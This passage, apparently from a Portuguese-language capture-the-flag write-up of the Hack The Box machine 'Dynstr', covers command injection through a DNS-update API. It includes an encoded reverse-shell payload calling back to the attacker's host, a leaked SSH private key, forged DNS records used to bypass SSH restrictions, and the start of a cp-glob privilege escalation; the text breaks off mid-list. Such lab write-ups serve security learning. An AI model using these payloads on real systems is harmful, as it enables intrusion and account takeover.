<p>De acordo com a documentação do No-IP, a API está localizada em <code class="language-plaintext highlighter-rouge">/nic/update</code> e utiliza autenticação básica, onde um request GET contendo o IP e o hostname a ser atualizado são suficientes para o registro/atualização, conforme exemplo abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'dynadns:sndanyd'</span> | <span class="nb">base64
</span>ZHluYWRuczpzbmRhbnlk
<span class="nv">$ </span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=myhostname.no-ip.htb"</span> <span class="nt">-v</span>
<span class="k">*</span>   Trying 10.10.10.244:80...
<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span>myhostname.no-ip.htb HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.10.244
<span class="o">&gt;</span> User-Agent: curl/7.74.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Fri, 13 Aug 2021 21:36:36 GMT
Date: Fri, 13 Aug 2021 21:36:36 GMT
&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Content-Length: 18
Content-Length: 18
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

&lt;
good 10.10.10.10
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
</code></pre></div></div>

<p>Enquanto brincava um pouco com a API comecei a receber alguns erros do tipo <strong>wrngdom</strong> quando nenhum dos domínios suportados encontra-se presente, conforme abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=;pwd"</span> <span class="nt">-v</span>
<span class="k">*</span>   Trying 10.10.10.244:80...
<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span><span class="p">;</span><span class="nb">pwd </span>HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.10.244
<span class="o">&gt;</span> User-Agent: curl/7.74.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Fri, 13 Aug 2021 21:38:23 GMT
Date: Fri, 13 Aug 2021 21:38:23 GMT
&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Content-Length: 16
Content-Length: 16
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

&lt;
911 <span class="o">[</span>wrngdom: <span class="o">]</span>
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
</code></pre></div></div>

<p>Buscando por possibilidades de injeção de código, comecei a fazer o fuzzing com um laço simples <code class="language-plaintext highlighter-rouge">while</code> com o conteúdo do dicionário em <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/wfuzz/Injections/All_attack.txt</code>, até obter o erro abaixo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="k">while </span><span class="nb">read </span>p<span class="p">;</span> <span class="k">do
while</span><span class="o">&gt;</span> curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname==</span><span class="nv">$p</span><span class="s2">.no-ip.htb"</span> <span class="nt">-v</span>
<span class="k">while</span><span class="o">&gt;</span> <span class="k">done</span> &lt; /usr/share/wordlists/wfuzz/Injections/All_attack.txt

<span class="o">[</span>...]
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
<span class="k">*</span>   Trying 10.10.10.244:80...
<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span><span class="nt">-1</span>.no-ip.htb HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.10.244
<span class="o">&gt;</span> User-Agent: curl/7.74.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Fri, 13 Aug 2021 21:30:11 GMT
Date: Fri, 13 Aug 2021 21:30:11 GMT
&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Content-Length: 22
Content-Length: 22
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

&lt;
911 <span class="o">[</span>nsupdate failed]
</code></pre></div></div>

<p>Uma vez que este menciona que o <code class="language-plaintext highlighter-rouge">nsupdate</code> falhou com o payload enviado (neste caso <code class="language-plaintext highlighter-rouge">-1.no-ip.htb</code>), significa que esta API apenas inicializa a execução deste binário de forma não interativa. Após alguma pesquisa, encontrei nesta página <a href="https://www.rtfm-sarl.ch/articles/using-nsupdate.html">Using the dynamic DNS editor, nsupdate (rtfm-sarl.ch)</a> alguns exemplos de uso que poderiam ser utilizados de modo a obter execução de código no backend, uma vez que este suporta standard input, que pode ser a forma utilizada na automação que atualiza as entradas de DNS nas zonas.</p>

<p>Para provar que isso está correto, fiz um teste simples, encapsulando os comandos que desejava utilizar dentro da estrutura <code class="language-plaintext highlighter-rouge">$()</code> e validei a entrada de DNS utilizando <code class="language-plaintext highlighter-rouge">dig</code>, o que retornou sucesso.</p>

<p><img src="https://i.imgur.com/r5qrIOo.png" alt="HTB Dynstr - OS Code injection payload" class="align-center" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dig @10.10.10.244 mytestsubdomain.no-ip.htb

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> @10.10.10.244 mytestsubdomain.no-ip.htb
<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 20816
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c46a9e70a58d51c501000000611a665bf50e119ef07ea985 (good)
;; QUESTION SECTION:
;mytestsubdomain.no-ip.htb.     IN      A

;; ANSWER SECTION:
mytestsubdomain.no-ip.htb. 30   IN      A       10.10.10.11

;; Query time: 68 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Mon Aug 16 10:21:33 -03 2021
;; MSG SIZE  rcvd: 98
</span></code></pre></div></div>

<p>Agora que confirmei que posso obter execução de código desta forma, modifiquei a requisição para iniciar um shell reverso a partir de um payload em base64, de modo a evitar erros de codificação.</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/nic/update?myip=10.10.10.11&amp;hostname=%24%28%65%63%68%6f%20%63%6d%30%67%4c%33%52%74%63%43%39%6d%4f%32%31%72%5a%6d%6c%6d%62%79%41%76%64%47%31%77%4c%32%59%37%59%32%46%30%49%43%39%30%62%58%41%76%5a%6e%77%76%59%6d%6c%75%4c%33%4e%6f%49%43%31%70%49%44%49%2b%4a%6a%46%38%62%6d%4d%67%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%54%49%78%49%44%51%30%4e%44%4d%67%50%69%39%30%62%58%41%76%5a%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%29.no-ip.htb</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.244</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.25.1</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic ZHluYWRuczpzbmRhbnlk</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>Iniciei a enumeração utilizando a conta <code class="language-plaintext highlighter-rouge">www-data</code>, padrão para o apache, utilizando o <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, onde os seguintes itens foram identificados:</p>

<ul>
  <li>Usuários com console e suas permissões:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=0(root) gid=0(root) groups=0(root)
uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
</code></pre></div></div>

<ul>
  <li>Habilidade de listar o conteúdo do diretório de outros usuários, onde podemos ver algumas chaves SSH para a conta <code class="language-plaintext highlighter-rouge">bindmgr</code></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Files inside others home (limit 20)
/home/bindmgr/support-case-C62796521/strace-C62796521.txt
/home/bindmgr/support-case-C62796521/C62796521-debugging.script
/home/bindmgr/support-case-C62796521/C62796521-debugging.timing
/home/bindmgr/support-case-C62796521/command-output-C62796521.txt
/home/bindmgr/user.txt
/home/bindmgr/.ssh/known_hosts
/home/bindmgr/.ssh/id_rsa.pub
/home/bindmgr/.ssh/authorized_keys
/home/bindmgr/.ssh/id_rsa
/home/bindmgr/.bashrc
/home/bindmgr/.bash_logout
/home/bindmgr/.profile
/home/dyna/.bashrc
/home/dyna/.bash_logout
/home/dyna/.profile
/home/dyna/.sudo_as_admin_successful
</code></pre></div></div>

<ul>
  <li>Revisando o conteúdo do diretório <code class="language-plaintext highlighter-rouge">/home/bindmgr</code>, podemos observar o arquivo <code class="language-plaintext highlighter-rouge">user.txt</code> para o qual não temos direitos de leitura. Neste perfil de usuário existe também uma pasta chamada <code class="language-plaintext highlighter-rouge">support-case-C62796521</code>, que contém alguns ouputs de debugging/trace de outras tarefas executadas no servidor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bindmgr/
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 <span class="nb">.</span>
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
<span class="nt">-r--------</span> 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
www-data@dynstr:/var/www<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Após analisar estes arquivos, notei que no <code class="language-plaintext highlighter-rouge">strace-C62796521.txt</code> temos uma chave privada em texto plano, que foi extraída e salva como <code class="language-plaintext highlighter-rouge">id_rsa</code>.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
[...]
</code></pre></div></div>

<ul>
  <li>Quando tentei utilizar esta chave para conectar via SSH com a conta <code class="language-plaintext highlighter-rouge">bindmgr</code>, recebi um erro. Ao revisar o conteúdo do arquivo <code class="language-plaintext highlighter-rouge">authorized_keys</code>, notei que temos uma instrução <code class="language-plaintext highlighter-rouge">from</code> definida, que limita a conexão utilizando a referida chave RSA a um determinado escopo de sistemas, neste caso máquinas com no subdomínio <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/tmp<span class="nv">$ </span><span class="nb">cat</span> /home/bindmgr/.ssh/authorized_keys
<span class="nv">from</span><span class="o">=</span><span class="s2">"*.infra.dyna.htb"</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
</code></pre></div></div>

<ul>
  <li>Para contornar este ponto, poderíamos alterar o arquivo hosts da máquina, o que não é possível dado privilégios atuais, ou utilizar o <code class="language-plaintext highlighter-rouge">nsupdate</code> para incluir a entrada desejada no servidor DNS, na zona <code class="language-plaintext highlighter-rouge">infra.dyna.htb</code>, o que foi tentado a partir do comando que é utilizado pela API, conforme abaixo:</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Update DNS entry</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"server 127.0.0.1</span><span class="se">\n</span><span class="s2">zone %s</span><span class="se">\n</span><span class="s2">update delete %s.%s</span><span class="se">\n</span><span class="s2">update add %s.%s 30 IN A %s</span><span class="se">\n</span><span class="s2">send</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$myip</span><span class="p">);</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'echo "'</span><span class="mf">.</span><span class="nv">$cmd</span><span class="mf">.</span><span class="s1">'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key'</span><span class="p">,</span><span class="nv">$retval</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>Com base nisso, utilizei o seguinte comando para adicionar a nossa entrada no referido subdomínio, porém a ação foi recusada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate
server 127.0.0.1
zone dyna.htb
update delete attacker.infra.dyna.htb
update add attacker.infra.dyna.htb 30 IN A 10.10.10.10
send
www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate | /usr/bin/nsupdate <span class="nt">-t</span> 1 <span class="nt">-k</span> /etc/bind/ddns.key
update failed: REFUSED
</code></pre></div></div>

<ul>
  <li>Após alguma pesquisa, encontrei que o status REFUSED poderia ocorrer se utilizasse uma chave inválida e, validando o diretório onde a chave <code class="language-plaintext highlighter-rouge">ddns.key</code> está localizada, encontrei outros dois arquivos (conforme abaixo) que poderiam ser utilizados, para o qual o <code class="language-plaintext highlighter-rouge">infra.key</code> retornou o sucesso esperado, embora ainda não tenha conseguido me conectar via SSH</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/bind/<span class="k">*</span>.key
<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind </span>100 Mar 15 20:44 /etc/bind/ddns.key
<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind </span>101 Mar 15 20:44 /etc/bind/infra.key
<span class="nt">-rw-r-----</span> 1 <span class="nb">bind bind </span>100 Mar 15 20:14 /etc/bind/rndc.key
</code></pre></div></div>

<ul>
  <li>Com algum troubleshooting adicional notei que a partir do servidor DNS era capaz de resolver o nome <code class="language-plaintext highlighter-rouge">attacker.infra.dyna.htb</code> mas a busca a reversa, a partir do endereço IP não era possível. Para contornar isso, incluí no comando de <code class="language-plaintext highlighter-rouge">nsupdate</code> as instruções necessárias para também incluir o registro do tipo PTR no DNS. Um ponto crucial que tive que fazer troubleshoot foi que entre as entradas A e PTR <strong>deve existir uma linha em branco</strong>, caso contrário o update falhará.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate
server 127.0.0.1
update add attacker.infra.dyna.htb 30 A 10.10.10.10
send

update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb
send
www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate | /usr/bin/nsupdate <span class="nt">-t</span> 1 <span class="nt">-k</span> /etc/bind/infra.key
www-data@dynstr:/dev/shm<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Após os devidos ajustes, fui capaz de me conectar com a conta <code class="language-plaintext highlighter-rouge">bindmgr</code> via SSH e ler o conteúdo do arquivo <code class="language-plaintext highlighter-rouge">user.txt</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 <span class="nb">.</span>
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
<span class="nt">-r--------</span> 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">cat </span>use
<span class="nb">cat</span>: use: No such file or directory
bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Como de costume, antes de dar sequência na enumeração da máquina por outros meios, executei o comando <code class="language-plaintext highlighter-rouge">sudo -l</code> e tive a grata surpresa de poder executar com privilégios elevados um script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries <span class="k">for </span>bindmgr on dynstr:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User bindmgr may run the following commands on dynstr:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
bindmgr@dynstr:~
</code></pre></div></div>

<p>Ao validar seu conteúdo, notei que existia uma entrada bastante interessante <strong>na linha 42</strong>, onde o script, executando como <code class="language-plaintext highlighter-rouge">root</code>, copia o arquivo <code class="language-plaintext highlighter-rouge">.version</code> e todos os demais existentes no diretório atual (<code class="language-plaintext highlighter-rouge">*</code>) para $BINDMGR_DIR. Também requer que o arquivo <code class="language-plaintext highlighter-rouge">.version</code> no diretório atual seja comparado com o previamente existente no servidor.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Stage new version of configuration files.</span>
<span class="nb">echo</span> <span class="s2">"[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">."</span>
<span class="nb">cp</span> .version <span class="k">*</span> /etc/bind/named.bindmgr/
</code></pre></div></div>

<p>Após a primeira execução, notei que o arquivo <code class="language-plaintext highlighter-rouge">.version</code> foi copiado com os privilégios de <code class="language-plaintext highlighter-rouge">root</code>, o que poderia nos permitir abusar de arquivos SUID.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.UzxayH3IIl<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
<span class="o">[</span>+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.UzxayH3IIl.
<span class="o">[</span>+] Creating /etc/bind/named.conf.bindmgr file.
<span class="o">[</span>+] Staging files to /etc/bind/named.bindmgr.
<span class="nb">cp</span>: cannot <span class="nb">stat</span> <span class="s1">'*'</span>: No such file or directory
<span class="o">[</span>+] Checking staged configuration.
<span class="o">[</span>-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/<span class="k">*</span>: file not found
bindmgr@dynstr:/tmp/tmp.UzxayH3IIl<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/bind/named.bindmgr/
total 12
drwxr-sr-x 2 root <span class="nb">bind </span>4096 Aug 16 18:22 <span class="nb">.</span>
drwxr-sr-x 3 root <span class="nb">bind </span>4096 Aug 16 18:22 ..
<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind    </span>2 Aug 16 18:22 .version
</code></pre></div></div>

<p>Revisando a página <a href="https://gtfobins.github.io/gtfobins/cp/#suid">cp | GTFOBins</a> para o cenário de SUID, notei que se o <code class="language-plaintext highlighter-rouge">cp</code> tiver este modo habilitado, poderia ser utilizado para copiar arquivos restritos do sistema, porém como não é o caso, precisaremos de outro meio de abusar do binário <code class="language-plaintext highlighter-rouge">cp</code> invocado neste script.</p>

<p>Um ponto mencionado na página acima é que podemos utilizar o parâmetro <code class="language-plaintext highlighter-rouge">--preserve</code> para <strong>preservar os atributos de arquivos</strong> durante a cópia. Adicionar este parâmetro na execução pode ser alcançado graças à uma feature do <code class="language-plaintext highlighter-rouge">bash</code> chamada <strong>file name expansion</strong>, popularmente conhecida como <strong><em><a href="https://tldp.org/LDP/abs/html/globbingref.html">globbing</a></em></strong> que <strong>expande</strong> os nomes dos arquivos durante a execução dos comandos. Este comportamento pode ser visto no exemplo abaixo com o comando <code class="language-plaintext highlighter-rouge">echo</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 0
<span class="nt">-rw-rw-r--</span> 1 bindmgr bindmgr 0 Aug 16 19:15 file.sh
<span class="nt">-rw-rw-r--</span> 1 bindmgr bindmgr 0 Aug 16 19:15 test.txt
bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx<span class="nv">$ </span><span class="nb">echo</span> <span class="k">*</span>
file.sh test.txt
</code></pre></div></div>

<p>Isso poderia ser explorado de modo a abusar da execução do <code class="language-plaintext highlighter-rouge">cp</code>, copiando um arquivo previamente configurado com SUID, permitindo a escalação de privilégios na sequência.</p>

<p>Este comportamento foi alcançado a partir da execução dos seguintes passos:</p>

<ul>
